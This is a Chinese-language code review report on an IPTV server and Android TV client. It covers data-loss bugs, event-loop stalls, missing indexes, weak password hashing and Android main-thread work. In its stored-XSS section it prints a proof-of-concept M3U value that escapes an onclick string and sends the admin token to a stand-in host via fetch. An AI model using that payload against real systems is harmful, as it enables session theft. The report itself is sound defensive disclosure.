# MediaIptv 代码优化审查报告

审查范围：`server/`（Node.js 服务端，~110 KB 源码）、`android/`（Kotlin TV 客户端，自有代码 ~190 KB，不含 vendored 的 ijkplayer/wangsu/aliyun）、`fpk/`（fnOS 打包）。

方法：全部源码通读 + 实际启动服务端跑接口验证 + 合成数据集基准测试。**所有标注「实测」的结论都跑过代码，不是推测。**

---

## 结论摘要

代码整体结构清晰、注释充分，分层（routes / services / db / auth）合理，播放器三引擎抽象也干净。没有发现需要重写的架构问题。

但存在 **1 个会丢用户数据的 Bug、1 个会让服务端整体卡死 7 秒的性能问题、3 个安全问题**，以及一批可观的性能优化空间。按性价比排序，最值得先做的 5 件事：

| # | 问题 | 影响 | 改动量 |
|---|---|---|---|
| 1 | 订阅刷新级联删除录制任务 | **丢数据**：自动刷新（默认 12h）每次清空录制任务，回看历史全部失联 | ~15 行 |
| 2 | EPG 同步同步阻塞事件循环 | **实测卡死 7.3 秒 / 897 MB 内存**，期间所有直播流中断 | ~30 行 |
| 3 | `/stream/*` 完全无鉴权 | 局域网内任何人可拉走全部直播流与录像 | ~20 行 |
| 4 | 管理后台存储型 XSS | 导入恶意 M3U 即可窃取管理员 token | ~5 行 |
| 5 | 缺失 4 个索引 | **实测慢 350 倍**（18.4ms → 0.052ms） | 5 行 SQL |

---

# 一、服务端 `server/`

## P0-1 订阅刷新会级联删除录制任务，并让回看历史失联 ⚠️ 丢数据

**位置**：`src/routes/admin.js:269-285`（`refreshSource`）、`src/db.js:95`

`record_tasks.channel_id` 声明了 `REFERENCES channels(id) ON DELETE CASCADE`，而 `refreshSource()` 会先删光该源的所有频道再重新导入：

```js
// admin.js:272-280
const delTx = db.transaction(() => {
  const ids = db.prepare('SELECT id FROM channels WHERE source_id = ?').all(source.id).map((r) => r.id);
  for (const cid of ids) {
    db.prepare('DELETE FROM channel_urls WHERE channel_id = ?').run(cid);
    db.prepare('DELETE FROM channels WHERE id = ?').run(cid);   // ← 级联删掉 record_tasks
  }
  return ids.length;
});
const removed = delTx();
const stats = importM3U(text, source.id);   // ← 新频道拿到全新 id
```

**实测验证**（真实 HTTP 接口，非静态推断）：

```
== create a record task on channel 1 (always-record) ==
   create -> 200 {"code":0,"msg":"ok","data":{"id":2}}
   tasks now: [{"id":2,"channel_id":1,"mode":"always",...}]
== now delete the channel through the normal admin API ==
   delete channel 1 -> 200 {"code":0,"msg":"ok","data":null}
   tasks after: []
   >>> RECORD TASK WAS SILENTLY DELETED (BUG CONFIRMED)
```

**影响面比看起来大**：

1. `refreshSource()` 不只被手动「立即更新」调用，还被 `admin.js:410` 的定时任务调用——**默认每 12 小时一次**（`auto_update=1` 的源）。用户配好的全天候录制任务会周期性静默消失。
2. `recordings.channel_id` 没有外键（`db.js:103-111`），所以录像文件与 DB 记录**不会**被删，但新频道拿到的是新 id → `/catchup/days`、`/catchup/list`、`/epg` 的 `hasRecord` 全部查不到 → **每次刷新后所有回看历史在 App 里消失**，而磁盘上的 .ts 文件还在，白占空间且无法清理（`cleanup()` 按 `channel_id` 匹配保留策略，`recorder.js:225` 注释「该频道已无任务，不自动清理」）。
3. `channels/batch-delete`（`admin.js:157-171`）与 `sources/:id` 删除（`admin.js:382-395`）走同样的删除路径，同样问题。

**建议改法**（保持频道 id 稳定，同时不误删用户数据）：

```js
// 方案 A（推荐）：刷新时按「分组+频道名」做 upsert，不删频道
//   - 已存在的频道：只更新 logo/epg_id/source_id，URL 做差异更新（不 DELETE 再 INSERT）
//   - 只有确实从订阅里消失的频道才删除，且删除前先停掉其录制任务并给出确认
// 方案 B（最小改动）：把外键改成 ON DELETE SET NULL，并在 refreshSource 里
//   先记录 channel_id → 迁移到新频道 id，再回填 recordings.channel_id 与 record_tasks.channel_id
// 方案 C（最省事）：refreshSource 干脆不删频道，只清空 channel_urls 后重新灌 URL
```

无论选哪个，都建议补上：`refreshSource` 结束时用新旧频道名映射回填 `recordings.channel_id`，否则历史录像永远救不回来。

---

## P0-2 EPG 同步同步阻塞事件循环 7.3 秒，内存峰值 897 MB ⚠️ 服务端整体卡死

**位置**：`src/services/epg.js:31-53`、`src/routes/admin.js:441-468`

三个同步重活串在一起，全部跑在事件循环上：

```js
// epg.js:45-49
if (buf.length > 2 && buf[0] === 0x1f && buf[1] === 0x8b) {
  buf = zlib.gunzipSync(buf);      // ① 同步解压
}
return buf.toString('utf8');       // ② 同步解码整个 buffer

// epg.js:18 + 53 —— async:false 是 xml2js 的默认值（已在 node_modules/xml2js/lib/defaults.js:21 确认）
const xmlParser = new xml2js.Parser({ explicitArray: false, mergeAttrs: true });
const result = await xmlParser.parseStringPromise(xmlText);   // ③ 实际是同步的，整棵 DOM 建在内存里
```

**实测**（39.9 MB XMLTV / 2.2 MB gzip / 268,800 条节目，心跳间隔 20 ms）：

```
=== running the exact fetchEpg + parseXmltv sequence ===
  zlib.gunzipSync(buf)   [fetchEpg]         243 ms wall clock
  buf.toString("utf8")   [fetchEpg]          56 ms wall clock
  parseStringPromise()   [parseXmltv]      6988 ms wall clock

=== event loop heartbeat (should be ~20ms) ===
  total heartbeats recorded      : 11
  max gap between heartbeats     : 7290 ms
  total time event loop was stalled: 7290 ms
  peak RSS: 897 MB
```

**7.29 秒内事件循环只跑了 11 次心跳（正常应是 ~365 次）**——这 7.29 秒里服务端不能转发任何直播流、不能响应任何 API、不能处理任何客户端心跳。对 IPTV 来说这是直接可见的：正在看的直播会卡住 7 秒。

更危险的是 `epg.js:37` 允许 `maxContentLength: 512 * 1024 * 1024`。按上表比例，512 MB 的 XMLTV 会需要 **约 11 GB 内存**，必然 OOM 崩溃。而 `admin.js:505` 的自动同步（每天 06:00）会在无人值守时触发它。

**建议改法**（分三步，可按需取舍）：

```js
// ① 解压改异步（几乎零成本，立刻回收 243ms）
buf = await new Promise((res, rej) =>
  zlib.gunzip(buf, (e, out) => e ? rej(e) : res(out)));

// ② 解析改流式：用 sax 直接遍历，不再建整棵 DOM（收益最大）
//    只保留 programme 的 start/stop/channel/title，边解析边批量入库
const sax = require('sax');
const parser = sax.parser(true);
parser.onopentag = (node) => { /* 记录当前 programme 字段 */ };
parser.onclosetag = (name) => { if (name === 'programme') buffer.push(row); };
// 每 5000 条 flush 一次进 DB，避免长事务

// ③ 无论如何都要做的兜底：把解析放进 worker_threads
//    即使解析本身是同步的，也不会再阻塞主线程转发直播流
```

**最低成本的高收益版本**：只做 ① + 把 `parseXmltv` 整体丢进 `worker_threads`。改动约 30 行，事件循环不再被冻结，直播流不受影响。

顺带一个并发隐患：`xmlParser` 是模块级单例，而 `xml2js` 的 `this.saxParser` 在构造函数里 `reset()` 时创建（已在 `node_modules/xml2js/lib/parser.js:78,119-126` 确认），解析状态存在实例上。目前 `syncEpg` 是串行 for 循环所以侥幸没炸，但只要管理员手动点同步、同时撞上 06:00 的自动同步，两次解析会互相污染。改成每次 `new xml2js.Parser(...)` 即可（开销可忽略）。

---

## P0-3 `/stream/live/:id` 与 `/stream/record/:id` 完全无鉴权 🔓

**位置**：`src/routes/stream.js:15-16`（整个 router 没有挂任何中间件）

**实测**（不带任何 header）：

```
=== SECURITY: /stream/live and /stream/record without any auth header ===
  /stream/live/1 -> 404 <!doctype html>...          ← 已到达上游，说明代理生效
  /stream/record/1 -> 200 GGGGGGGGGG...             ← 直接拿到 100 KB 录像内容
```

对比 `/admin/api/channels` 无 token 返回 401（正常），说明这是设计遗漏而非有意为之：`client.js` 的 `/api/client/*` 有 `clientMiddleware`，但下发给客户端的流地址是裸的 `${base}/stream/live/${u.id}`（`client.js:100`），播放器拉流时无法带 `X-Device-Id`/`X-Token`。

**影响**：局域网内任何设备（含访客 Wi-Fi、被入侵的 IoT 设备）都能枚举 `/stream/record/1..N` 拉走全部录像，或按 `channel_urls.id` 白嫖全部直播源——而这正是「代理转发以隐藏原始源地址」要防的事。

**建议改法**（对客户端透明）：

```js
// 1. 下发频道列表时，给流地址带上一次性/短期签名
//    client.js:100
const sig = signStream(u.id, req.deviceId);          // HMAC(secret, `${id}:${deviceId}:${exp}`)
url = `${base}/stream/live/${u.id}${ext}?t=${exp}&s=${sig}`;

// 2. stream.js 里校验签名（保持对 /api/client/logo 公开）
router.get('/live/:channelUrlId', requireStreamSig(db), (req, res) => { ... });
router.get('/record/:id',        requireStreamSig(db), (req, res) => { ... });
```

签名用 `X-Token` 或独立 secret，有效期给足（比如 12h），这样 ExoPlayer/ijk 原生拉流不用改任何东西。如果短期内不想动客户端，至少先把 `/stream/record/:id` 挂上 `clientMiddleware`（录像回看走的是 App 内部请求，可以带 header），并把 `/stream/live` 限定为仅接受来自已知客户端 IP 段的请求。

---

## P0-4 管理后台存储型 XSS 🔓

**位置**：`server/public/admin/index.html:423, 611, 612, 683, 723, 724, 728`

`esc()` 做的是 HTML 实体转义，但被转义的值放在了**HTML 属性里的 JS 字符串字面量**中：

```js
// index.html:423
`<button class="btn small" onclick="renameGroup(${g.id},'${esc(g.name)}')">改名</button>`
// index.html:611-612
`<button ... onclick="renameSource(${s.id}, '${esc(s.name)}')">改名</button>`
`<button ... onclick="delSource(${s.id}, '${esc(s.name)}')">删除</button>`
// index.html:723-728 —— 设备 id 来自客户端上报，完全可控
`<button ... onclick="approveDevice('${esc(d.id)}')">通过</button>`
```

`esc("'")` 产出 `&#39;`，浏览器**先把属性值 HTML 解码**再当 JS 解析 → `&#39;` 变回 `'` → 成功逃逸字符串字面量。

PoC：一个 M3U 订阅里写 `group-title="x');fetch('http://evil/'+localStorage.adminToken);//"`，管理员在后台点一下「改名」，token 就被带走。`localStorage.adminToken` 正是 `index.html:322` 存的管理员会话。

**建议改法**：不要把数据塞进 `onclick` 字符串。改成 `data-*` 属性 + 事件委托：

```js
// 渲染
`<button class="btn small" data-act="rename-group" data-id="${g.id}" data-name="${esc(g.name)}">改名</button>`
// 统一委托（放在 enterApp 里注册一次）
document.addEventListener('click', (e) => {
  const btn = e.target.closest('[data-act]');
  if (!btn) return;
  const { act, id, name } = btn.dataset;
  if (act === 'rename-group') renameGroup(+id, name);
  // ...
});
```

这样 `esc()` 就回到正确的（属性）语境，XSS 面消失。共 7 处，改动约 30 行。

---

## P1-1 缺 4 个索引，实测慢 350 倍

**位置**：`src/db.js:36-142`（`migrate()` 只建表，没有任何 `CREATE INDEX`）

**实测**（5000 频道 / 15000 线路 / 200000 录像 / 200000 节目）：

```
--- BEFORE indexes ---
  catchup/days              18.435ms  SCAN recordings | USE TEMP B-TREE FOR DISTINCT
  catchup/list              26.538ms  SCAN recordings | USE TEMP B-TREE FOR ORDER BY
  epg hasRecord             31.275ms  SCAN recordings
  channels by source         0.486ms  SCAN channels
  urls by channel            1.627ms  SCAN channel_urls

--- AFTER indexes ---
  catchup/days               0.052ms  SEARCH recordings USING INDEX (channel_id=?)
  catchup/list               0.005ms  SEARCH recordings USING INDEX (channel_id=? AND date=?)
  epg hasRecord              0.003ms  SEARCH recordings USING INDEX (channel_id=? AND date=?)
  channels by source         0.070ms  SEARCH channels USING COVERING INDEX (source_id=?)
  urls by channel            0.014ms  SEARCH channel_urls USING INDEX (channel_id=?)
```

`/epg/now` 每次请求都会跑一遍 `epg_programs` 的全表 join（`client.js:150-160`），`/channels` 每次全表扫 `channel_urls`——这些在 App 每次启动/换台时都会触发。

**建议改法**（加进 `migrate()`，`CREATE INDEX IF NOT EXISTS` 幂等）：

```sql
CREATE INDEX IF NOT EXISTS idx_channel_urls_channel  ON channel_urls(channel_id);
CREATE INDEX IF NOT EXISTS idx_channels_source       ON channels(source_id);
CREATE INDEX IF NOT EXISTS idx_recordings_channel_date ON recordings(channel_id, date);
CREATE INDEX IF NOT EXISTS idx_record_tasks_channel  ON record_tasks(channel_id);
CREATE INDEX IF NOT EXISTS idx_epg_programs_date     ON epg_programs(date);
```

代价：33.6 MB 数据集的索引约几 MB，写入略慢（录制场景可忽略）。**5 行 SQL 换 350 倍**，这是全项目性价比最高的一处改动。

---

## P1-2 没有优雅退出 → 重启后留下孤儿 ffmpeg 进程

**位置**：`src/index.js:15-20`（只注册了 `uncaughtException` / `unhandledRejection`）

`fpk/package/cmd/main:118` 用 `kill "${pid}"` 发 SIGTERM，Docker 的 `docker stop` 也是 SIGTERM。Node 没有 SIGTERM handler → 立即退出：

- `recorder.js` 里 spawn 的 ffmpeg **不会被回收**，会继续录制、继续写 .ts 到磁盘，直到自己失败为止（父进程已死，它们被 reparent 到 init）
- `node:sqlite` 没有 `close()`，WAL 不做 checkpoint
- `logger` 的写流没有 flush，最后几行日志丢失
- `cmd/main` 已经把 PID 文件删了，服务管理器再也找不到这些孤儿

**建议改法**：

```js
// index.js
const server = app.listen(...);
let shuttingDown = false;
const shutdown = async (sig) => {
  if (shuttingDown) return;
  shuttingDown = true;
  logger.info(`[fatal] ${sig} received, shutting down`);
  server.close();                                   // 停止接受新连接
  for (const [id, entry] of recorder.running) {     // 先杀 ffmpeg
    try { entry.stopping = true; entry.proc?.kill('SIGKILL'); } catch {}
  }
  try { db.close(); } catch {}                      // WAL checkpoint + flush
  setTimeout(() => process.exit(0), 3000).unref();  // 兜底
};
process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT',  () => shutdown('SIGINT'));

// fpk/package/cmd/main：用进程组杀，才能覆盖 ffmpeg 子进程
setsid "${NODE_BIN}" src/index.js ... &
kill -TERM -"${pid}"
```

---

## P1-3 访问日志过滤失效，且路径被截断（已实测）

**位置**：`src/index.js:37-46`

```js
app.use((req, res, next) => {
  res.on('finish', () => {
    // 直播流不写访问日志（量大且无意义），但记录断开
    if (!req.path.startsWith('/stream/live')) {          // ← 永远为真
      logger.info(`${req.method} ${req.path} ...`);
    }
  });
});
```

Express 挂载子路由时会临时把 `req.url` 剥掉前缀，而 `res.on('finish')` 在响应结束时才触发——此时 `req.path` 已经是**剥掉挂载点之后**的路径。实测日志：

```
[INFO] GET /live/1 404 392ms            ← 直播流被记录了，且路径丢了 /stream 前缀
[INFO] POST /login 200 7ms              ← 应该是 /admin/api/login
[INFO] GET /channels 401 1ms            ← 应该是 /api/client/channels
```

两个后果：① 注释里说的「直播流不写日志」实际没生效，最高频的接口在刷日志；② 所有日志路径都缺挂载前缀，排查问题时对不上号。

**建议改法**：

```js
const url = req.originalUrl || req.url;              // 用 originalUrl
if (!url.startsWith('/stream/live')) {
  logger.info(`${req.method} ${url} ${res.statusCode} ${Date.now() - start}ms`);
}
```

---

## P1-4 管理员密码哈希太弱

**位置**：`src/auth.js:9-11`、`src/db.js:151`

```js
function hashPassword(password, salt) {
  return crypto.createHash('sha256').update(password + salt).digest('hex');   // 单轮 SHA-256
}
```

- 单轮 SHA-256 + 8 字节 salt：现代 GPU 每秒可试数十亿次，弱口令瞬间破解
- `auth.js:34` 用 `!==` 比较哈希，不是常数时间（时序侧信道，实际风险低但应顺手修）
- 修改密码时复用旧 salt（`admin.js:50`），且没有使已有会话失效

**建议改法**（`node:crypto` 内置，无需新依赖）：

```js
const SCRYPT = { N: 16384, r: 8, p: 1, keylen: 64 };
function hashPassword(password, salt) {
  return crypto.scryptSync(password, salt, SCRYPT.keylen, SCRYPT).toString('hex');
}
function verifyPassword(password, salt, expected) {
  const actual = Buffer.from(hashPassword(password, salt), 'hex');
  const want = Buffer.from(expected, 'hex');
  return actual.length === want.length && crypto.timingSafeEqual(actual, want);
}
```

注意需要**兼容迁移**：`admins` 表加一列 `algo`（默认 `sha256`），登录时若 `algo='sha256'` 且校验通过，就地升级为 scrypt 并改写该行。这样老库无需人工干预。

---

## P1-5 FPK 环境变量会在每次重启时强制重置管理员密码

**位置**：`src/db.js:157-169`（`applyAdminPasswordEnv`）+ `fpk/package/cmd/main:87-88, 97`

```js
// db.js:158-168
const envPwd = (process.env.ADMIN_PASSWORD || '').trim();
if (!envPwd || envPwd === 'admin') return;
const currentHash = sha256(envPwd + row.salt);
if (currentHash === row.password_hash) return;   // 匹配则跳过
// 否则——把密码改回 envPwd
db.prepare("UPDATE admins SET password_hash = ?, salt = ? ...").run(newHash, newSalt);
```

而 `cmd/main` **每次启动**都会从 `${TRIM_PKGVAR}/admin_password` 读取并导出 `ADMIN_PASSWORD`。于是：管理员在后台「系统设置 → 修改密码」改完密码 → 服务重启（或 fnOS 重启）→ 密码被静默改回安装向导里那个值。

**建议改法**：环境变量只在**首次初始化**时生效，之后不再覆盖：

```js
function applyAdminPasswordEnv() {
  const envPwd = (process.env.ADMIN_PASSWORD || '').trim();
  if (!envPwd || envPwd === 'admin') return;
  const row = db.prepare("SELECT salt, password_hash FROM admins WHERE username='admin'").get();
  if (!row) return;
  // 只在「从未被用户改过」时应用（用 settings 标记）
  const changed = db.prepare("SELECT value FROM settings WHERE key='adminPwdChanged'").get();
  if (changed) return;
  ...
}
// admin.js 的 /password 成功后写入 settings.adminPwdChanged = '1'
```

同时在向导文案里说明「此处设置的密码仅用于首次初始化」。

---

## P1-6 EPG 表无限增长，且 `INSERT OR REPLACE` 会翻倍写放大

**位置**：`src/routes/admin.js:444-457`

`syncEpg()` 把 XMLTV 里**所有日期**的节目全部写入，且从不清理历史：

```js
const ins = db.prepare('INSERT OR REPLACE INTO epg_programs (epg_id, date, start, end, title) VALUES (?,?,?,?,?)');
```

`OR REPLACE` 在撞上 `UNIQUE(epg_id, date, start)` 时是「删除旧行 + 插入新行」——rowid 持续增长，表文件永不收缩。典型 XMLTV 覆盖 7 天，每天同步一次，历史数据永远留着但 `/epg` 与 `/epg/now` 只查当天。

**建议改法**：同步结束后加一句清理，并改用 `ON CONFLICT DO UPDATE`（避免删+插）：

```js
db.prepare("DELETE FROM epg_programs WHERE date < date('now','-2 day')").run();
// 并把 INSERT OR REPLACE 改为真正的 upsert：
// INSERT INTO epg_programs (...) VALUES (...) ON CONFLICT(epg_id,date,start) DO UPDATE SET end=excluded.end, title=excluded.title
```

---

## P2 其他值得做但优先级较低的服务端项

| 位置 | 问题 | 建议 |
|---|---|---|
| `admin.js:58-78` | `/stats` 每次请求同步递归遍历整个录像目录（`statSync` 逐文件）。10000 个 30 分钟分片 = 每次 10000 次 stat | 结果缓存 30 秒，或在 `recordings` 表维护 `size` 列累加 |
| `recorder.js:165-204` | `scanSegments` 每 2 分钟全量遍历 + 逐文件 `statSync`（同上规模） | 用 `readdirSync(dir, {withFileTypes:true})` 省掉一半 stat；或按 mtime 增量扫描 |
| `auth.js:69` | `clientMiddleware` 每个已鉴权请求都做一次 DB **写**（`UPDATE devices SET last_seen`），配合 WAL 是每请求一次磁盘写 | 按设备节流（内存记 `deviceId → 上次写入时间`，60 秒内跳过） |
| `db.js:19-29` | `db.transaction` 不支持嵌套（`BEGIN` 套 `BEGIN` 会抛错）。目前调用路径恰好没有嵌套，但很脆 | 用保存点（`SAVEPOINT`）或加深度计数 |
| `admin.js:483-502` | `/epg/preview` 与 `client.js:170-193` 的 `/epg` 是逐行重复的代码 | 抽成一个共享函数 |
| `admin.js:545-549` | `logoName()` 与 `logo.js:21-28` 的 `normalizeName()` 是两份近似实现（一个不去小写、一个去） | 统一到 `logo.js` |
| `stream.js:31-41`、`probe.js:41-49`、`recorder.js:45-51`、`client.js:92` | `url\|User-Agent=xxx` 的解析逻辑散落 4 处，各写一遍 | 抽 `services/streamUrl.js` 的 `splitStreamUrl()` |
| `logger.js:59-70` | `tail()` 把整个日志文件 `readFileSync` 进内存再切尾部 | 从文件末尾反向读固定字节数（`fs.open` + 读最后 64 KB） |
| `index.js:54` | `/admin` 静态资源无缓存头 | `express.static(..., { maxAge: '1h' })`（HTML 保持 no-cache） |
| `client.js:63, 214` | `base = \`http://${req.headers.host}\`` 硬编码 http，反代/HTTPS 下会下发错误地址 | 尊重 `X-Forwarded-Proto` |
| 全局 | 响应无 gzip。大播放列表下 `/api/client/channels` 是 App 启动时最大的 payload | 加 20 行 zlib 中间件，或直接 `npm i compression`（OkHttp 默认带 `Accept-Encoding: gzip` 并自动解压，客户端零改动） |

---

# 二、Android 客户端 `android/`

> 以下条目来自对 `MainActivity.kt`（1735 行）、三个 Adapter、三个播放引擎、`Av3a*`、`App.kt`、`Prefs.kt`、`SystemStats.kt`、布局与 Manifest 的逐行审查。标注「已复核」的条目我本人也打开了对应源码确认。

## P0-1 OSD 统计行每 500ms 在主线程做文件 I/O + 编译正则 + 读 PSS + JNI 查询（已复核）

**位置**：`MainActivity.kt:1149-1172` → `ExoEngine.statsText()` → `SystemStats.kt:35-62`

```kotlin
// MainActivity.kt:1164-1171 —— 默认间隔 500ms（Prefs.kt:263-264）
statsRunnable = object : Runnable {
    override fun run() {
        if (currentPanel != Panel.OSD) return
        updateOsdStats()                        // → engine.statsText()，全程主线程
        mainHandler.postDelayed(this, interval)
    }
}
```

```kotlin
// SystemStats.kt:38-43 —— 每次调用都新建 Regex
val tokens = File("/proc/self/stat").readText()
    .substringAfterLast(')').trim()
    .split(Regex("\\s+"))          // ← Kotlin Regex 无缓存，每次重新编译 Pattern
```

再叠加 `Debug.getMemoryInfo()`（遍历进程内存映射）、`hasAv3aDecoder()` → `MediaCodecUtil.getDecoderInfos()`（binder 到 media.codec），以及 3 次 `String.format`。在弱 TV SoC 上就是每秒两次的可见卡顿——而且恰好发生在用户正在读 OSD 的时候。

**建议**：① `Regex` 提到 `SystemStats` 的顶层 `private val`；② CPU/PSS 采样挪到后台协程写入 `@Volatile` 字段，`statsText()` 只读缓存；③ `hasAv3aDecoder()` 是设备常量，构造时算一次即可；④ 默认间隔提到 1000ms，OSD 不可见时不采样。

## P0-2 整份频道列表的 JSON 解析在主线程（已复核）

**位置**：`Repository.kt:54-61`、`ApiClient.kt:65-73`

```kotlin
// ApiClient.kt:65 —— HTTP 在 IO 线程
suspend fun get(...) = withContext(Dispatchers.IO) { ... }
// Repository.kt:55-57 —— 但解析回到了调用者的上下文（Dispatchers.Main.immediate）
val json = ApiClient.get(context, "/api/client/channels")
val resp = moshi.adapter<ApiResponse<ChannelListData>>(type).fromJson(json)   // ← 主线程
```

`/api/client/channels` 是全 App 最大的 payload（所有分组 + 所有频道 + 所有线路）。冷启动时在 UI 线程解析，大列表下会掉帧甚至 ANR。

**建议**：在每个 Repository 方法里把解析包进 `withContext(Dispatchers.Default) { ... }`，或让整个 Repository 跑在 IO 上、只在调用点回主线程。

## P0-3 未清理的 Handler 回调导致 Activity 泄漏，其中一个会无限自我重投（已复核）

**位置**：`MainActivity.kt:1313-1328`、`1718-1729`

```kotlin
// 1315-1326 —— 焦点在分组列表时每 3.5 秒重新投递自己
channelPanelHideRunnable = object : Runnable {
    override fun run() {
        if (currentPanel != Panel.CHANNEL) return
        if (binding.rvGroups.hasFocus()) {
            mainHandler.postDelayed(this, CHANNEL_PANEL_AUTO_HIDE_MS)   // ← 自我重投
            return
        }
        hideAllPanels()
    }
}
```

```kotlin
// 1718-1729 —— onDestroy 只清了 4 个，漏了 6 个
override fun onDestroy() {
    super.onDestroy()
    osdHideRunnable?.let { mainHandler.removeCallbacks(it) }
    epgRefreshRunnable?.let { mainHandler.removeCallbacks(it) }
    cancelSwitchWatchdog()
    stopStatsPolling()
    // ← 未清理：channelPanelHideRunnable、statusHideRunnable、
    //   numberInputRunnable、splashFallback、长按 longPressRunnable
    ...
}
```

这些 Runnable 都强引用 Activity + `binding`。`channelPanelHideRunnable` 最危险：Activity 销毁时若面板正好开着且 `rvGroups` 仍有焦点，它会每 3.5 秒重新投递，**永不停止**。

**建议**：`onDestroy` 里补齐 6 个字段的 `removeCallbacks`；或统一改成生命周期感知的 ticker（`lifecycleScope.launch { repeatOnLifecycle(...) { while(true) { ...; delay(ms) } } }`），从根上消除手工管理。

## P0-4 回看进度轮询每次点击都新起一个永不取消的循环

**位置**：`MainActivity.kt:1079`、`1083-1096`

```kotlin
private fun startProgressPolling() {
    lifecycleScope.launch {
        while (isCatchupMode) { ... updateCatchupProgress(pos, dur) ...; delay(500) }
    }
}
```

没有保存 `Job`，而 `playCatchup()` 每次都调用它。在回看模式下再点一个节目时 `isCatchupMode` 仍为 `true` → **旧循环不会退出** → N 次点击就有 N 个 500ms 循环同时写同一个 SeekBar。同时它还与 `ExoEngine` 的 `onPositionChanged` 回调重复。

**建议**：`private var progressJob: Job?`；启动前 `progressJob?.cancel()`；`backToLive()` / `onDestroy()` 里取消。

## P1 Android 中等优先级

| 位置 | 问题 | 建议 |
|---|---|---|
| `SystemEngine.kt:139-188` | **缩放功能实际失效**：`Matrix` 是局部变量，从未交给任何 `Canvas`/`SurfaceHolder`（死代码）；唯一的实际生效手段 `setFixedSize()` 又被 187 行的 `setSizeFromLayout()` 撤销（两者互斥）。结果 fit/fill/zoom/169 渲染完全一样 | 删掉死 Matrix，只保留计算目标 buffer 尺寸的分支，删掉 187 行；或改用 `IjkEngine.AspectSurfaceView`（三引擎里唯一正确的实现）。另外 155-156 行两个三元表达式两支完全相同 |
| `IjkEngine.kt:87-100` → `IjkMediaPlayer.java:189-203` | 首次 AV3A 换台在主线程 `System.loadLibrary` **约 16 MB** 的 .so（`libwsrtcsdk` 5.48 MB + `libijkffmpeg` 7.95 MB + `libRtsSDK` 2.21 MB + …）。`App.kt:33-41` 只预热了 media3 的 FFmpeg，没预热 ijk | 在 `App` 的后台预热线程里加 `IjkMediaPlayer.loadLibrariesOnce(null)`（幂等），把加载挪出换台路径 |
| `ExoEngine.kt:455-499` | `setSource()` 不重置每路流的状态：`streamStats` 未清（换台后 8 秒内码率是两路混合）、`av3aNotified` 永久锁死（同一实例重播时 AV3A 提示再也不会触发 → 无声且无提示）、`codecErrorTimes` 残留（旧错误 + 新错误会误触发「重新解码」） | 加 `resetStreamState()` 在 `setSource()` 开头调用 |
| `MainActivity.kt:1111-1123`、`808-812`、`675` | 每次换台做 3~4 次全列表 O(N) 扫描且命中后不 break；`groups.flatMap{...}` 还额外分配一份完整频道副本。5000 频道下每次换台约 1.5~2 万次比较 | `loadChannels` 后建一次 `HashMap<Int, Pair<Int,Int>>`（channelId → 组索引/频道索引），之后 O(1) 查 |
| `ChannelAdapter.kt:60-63` | `submitNowPlaying` 直接 `notifyItemRangeChanged(0, size)` 全量重绑；每 10 分钟一次，每次所有可见行重建 `GradientDrawable` + 重新发起 Glide 请求 | 对比新旧 map，只 `notifyItemChanged` 标题真变了的行 |
| `ChannelAdapter.kt:114-118, 127-144` | 每次 bind 都 `GradientDrawable()` 新建 + 新建匿名 `RequestListener` + `name.take(2)` | 6 个 `GradientDrawable` 提到 `companion object` 复用；复用单个 listener |
| `MainActivity.kt:413-432` | 每次 `onVideoSizeChanged` 都 POST `/report-resolution`，无去重；重新 prepare 会重复触发 | 记住上次上报的 `urlId/w/h`，相同则跳过 |
| `MainActivity.kt:739-769` | 10 分钟 EPG 刷新在面板关闭、甚至未播放时也无条件拉取 `epgNow()` + 当前频道 EPG | 用 `currentPanel == Panel.EPG` 或播放状态做门控 |
| `MainActivity.kt:1499-1518` | `dispatchKeyEvent` 不区分 `repeatCount`，长按上下键会按重复速率疯狂换台 + 每次发一个 EPG 请求 | 加节流（如 250ms 内忽略重复） |
| `activity_main.xml:12` | `android:keepScreenOn="true"` 写在布局上，而 `MainActivity.kt:1693-1699` 又按 `Prefs.getKeepScreenOn` 加/清 window flag → **设置里的「播放时强制不息屏」关掉也没用** | 删掉布局上的 `keepScreenOn`，只保留 window flag |
| `MainActivity.kt:674-679` | 启动选台可能选中 `urls` 为空的频道 → `playChannel` 第一行就 `return`（801-802）→ 黑屏且无任何提示 | `remembered?.takeIf { it.urls.isNotEmpty() } ?: groups.firstNotNullOfOrNull { g -> g.channels.firstOrNull { it.urls.isNotEmpty() } }`，全空时提示用户 |
| `MainActivity.kt:396-403` | 自动换源提示的线路号在自增**之后**拼接，前半段是新的、后半段也对不上，且都是 0 基 | 自增前先 `val failed = currentSourceIndex`，提示用 `failed + 1` / `currentSourceIndex + 1` |
| `MainActivity.kt` 全局 | 没有覆写 `onStop`/`onPause`，退到后台后 60s 心跳、10 分钟 EPG 刷新、进度轮询继续跑；`ExoEngine` 的 stall monitor 每 2 秒无条件唤醒主线程（暂停时也唤醒） | `onStop` 里停掉轮询与 monitor，`onResume` 恢复；stall monitor 只在 `playWhenReady` 时重投 |
| `MainActivity.kt:286-295` | 点分组只更新 `currentGroupIndex`，`currentChannelIndexInGroup` 仍是旧组的索引 → 之后按上下键会跳到新组里一个无意义的序号 | 切组时同步重算或归零 |
| `SystemEngine.kt:92-103` | 只 `catch (e: IOException)`，而 `setDataSource` 会抛 `IllegalArgumentException`/`SecurityException`（rtmp://、udp:// 等不支持的 scheme），`prepareAsync` 抛 `IllegalStateException` → **最后一个兜底引擎会直接崩溃**而不是回调 `onError` | 改 `catch (e: Exception)`，并在失败时调 `listener.onError` + `releaseCurrent()` |
| `IjkEngine.kt:157-163` | `mp.mediaInfo` 每次 OSD tick 都做 3 次 JNI + 完整解析 Bundle（`IjkMediaMeta.parse` 为每个流分配对象） | 缓存 `MediaInfo`，最多 2 秒刷新一次 |
| `IjkEngine.kt:258-267` | `releasePlayer()` 只调 `release()` 不调 `reset()`。`IjkMediaPlayer.release()` 不清 `mEventHandler` 队列，native 已投递的消息会在 release 后继续派发；surface 回调也从不摘除 | release 前先 `reset()`，并在 `release()` 里 `holder.removeCallback(cb)`、置空 `videoSurface` |
| `IjkEngine.kt:47, 240-250` | `bitrateSamples` 换台不清，OSD 显示旧频道码率最长 8 秒 | `startPlay()` 里 `bitrateSamples.clear()` |
| `ExoEngine.kt:86-99` | `MediaCodecSelector` 每次查询都 `filter` 出新 List；`ifEmpty { all }` 会让「软解」设置在无软解器设备上静默变成硬解 → `MainActivity.kt:911-919` 的软解降级阶梯变成空操作，恢复循环可能空转 | 按 (mime, mode) 缓存过滤结果；无法满足时明确回调而不是静默回退 |
